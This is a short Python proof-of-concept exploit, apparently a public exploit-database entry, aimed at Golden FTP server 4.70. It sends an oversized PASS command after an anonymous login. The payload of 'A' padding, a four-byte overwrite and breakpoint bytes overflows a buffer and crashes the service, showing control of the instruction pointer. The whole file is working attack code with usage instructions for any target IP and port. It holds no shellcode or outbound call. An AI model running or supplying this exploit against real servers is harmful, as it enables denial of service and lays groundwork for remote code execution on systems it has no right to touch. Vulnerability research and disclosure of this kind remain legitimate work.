#!/usr/bin/python
# Golden FTP POC/DOS Exploit
# Version: 4.70
# Date: 01/17/2011
# Author: Craig Freyman (cd1zz)
# Tested On: Windows XP SP3
# Vendor Contacted: 01/17/2011 (no response)





import socket
import sys
import time

Bs = '\x42' * 4

buffer = '\x41' * 533 + Bs + '\xcc' * 300

if len(sys.argv) != 3:
    	print "Usage: ./goldenftp.py <ip> <port>"
        sys.exit()
 
ip   = sys.argv[1]
port = sys.argv[2]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:	
	print "[*] Sending evil buffer"
	s.connect((ip,int(port)))
	s.recv(1024)
	time.sleep(2)
	s.send('USER anonymous'+ '\r\n')
	s.recv(1024)
	time.sleep(3)	
	s.send('PASS ' + buffer + '\r\n')
	s.recv(1024)	
	time.sleep(1)
	s.close()
except:
	print "Can't Connect to Server"
	sys.exit()
